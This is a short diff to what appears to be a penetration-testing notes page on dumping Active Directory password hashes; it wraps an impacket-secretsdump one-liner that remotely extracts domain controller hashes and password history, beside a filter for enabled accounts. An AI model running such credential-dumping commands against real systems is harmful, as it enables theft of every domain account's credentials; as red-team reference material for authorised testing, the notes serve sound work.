@@ -35,9 +35,11 @@ cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -
 
 Or you can do it with a 1 liner remotely. but becareful it doesnt crash the connection
 
+{% code overflow="wrap" %}
 ```
 impacket-secretsdump -just-dc -user-status -pwd-last-set -history -exec-method smbexec DOMAIN/USER:PASS@IP
 ```
+{% endcode %}
 
 ## crackmapexec
 
